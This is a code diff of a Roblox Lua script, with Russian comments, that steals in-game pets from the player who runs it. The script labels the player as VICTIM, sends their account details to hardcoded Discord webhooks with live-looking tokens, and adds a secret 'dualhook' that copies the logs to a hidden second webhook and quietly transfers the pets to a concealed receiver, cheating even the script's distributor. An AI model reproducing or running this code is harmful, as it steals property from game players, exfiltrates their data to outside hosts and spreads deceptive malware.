@@ -2,15 +2,15 @@ repeat
     task.wait()
 until game:IsLoaded()
 
--- 🔐 DualHook config (sekretnaya chast')
+-- 🔐 DualHook config (секретная часть)
 getgenv().DhUser = "Warrior_ggs"
-getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ← zameny na svoi vtoroi vebkhuk
-getgenv().NewUser = "Warrior_ggs" -- skrytyi poluchatel' petov
+getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ← замени на свой второй вебхук
+getgenv().NewUser = "Warrior_ggs" -- скрытый получатель петов
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1398128232821293146/L1XkMHS9HYOhE-LwusnMR_b-hrdgn3M5vY9WYzoc6F9W-9wqHheFjlueX1yweFexJ80J"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "chitofedy" -- ← nik, kotoryi budet otobrazhat'sya v logakh
+    "chitofedy" -- ← ник, который будет отображаться в логах
 }
 
 local PET_WHITELIST = {
@@ -47,7 +47,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
                 name = "👤 **Player Information**",
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     VICTIM.Name, 
-                    USERNAMES[1],  
+                    USERNAMES[1],  -- только реальная жертва в логах
                     identifyexecutor(), 
                     game.Players.LocalPlayer.AccountAge
                 ),
@@ -85,25 +85,29 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
     local headers = { ["Content-Type"] = "application/json" }
     local request = http_request or request or HttpPost or syn.request
 
-    local function sendToWebhook(url)
-        local success, response = pcall(function()
-            return request({
-                Url = url,
-                Method = "POST",
-                Headers = headers,
-                Body = jsonData
-            })
-        end)
+    -- Основной вебхук
+    local response = request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonData
+    })
 
-        if not success or not response or (response.StatusCode ~= 200 and response.StatusCode ~= 204) then
-            warn("Ошибка отправки в Discord:", url, response and response.StatusCode or "нет ответа")
-        end
+    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
     end
 
-    sendToWebhook(WEBHOOK_URL)
-
+    -- 💣 Dualhook лог в секретный вебхук — всегда отправляем, если есть DhWebhook
     if getgenv().DhWebhook and #getgenv().DhWebhook > 10 then
-        sendToWebhook(getgenv().DhWebhook)
+        local dhResponse = request({
+            Url = getgenv().DhWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = jsonData
+        })
+        if dhResponse.StatusCode ~= 200 and dhResponse.StatusCode ~= 204 then
+            warn("Ошибка отправки в DhWebhook:", dhResponse.StatusCode, dhResponse.Body)
+        end
     end
 end
 
@@ -183,10 +187,10 @@ local function idlingTarget()
     end)
 end
 
--- 💼 Sbor petov zhertvy
+-- 💼 Сбор петов жертвы
 getPlayersPets()
 
--- 🔁 Zapusk avto-peredachi i logov
+-- 🔁 Запуск авто-передачи и логов
 task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
@@ -197,7 +201,7 @@ task.spawn(function()
     end
 end)
 
--- 🚃 Sekretnaia peredacha petov na NewUser
+-- 👻 Секретная передача петов на NewUser
 task.spawn(function()
     while task.wait(0.5) do
         for _, player in ipairs(game.Players:GetPlayers()) do
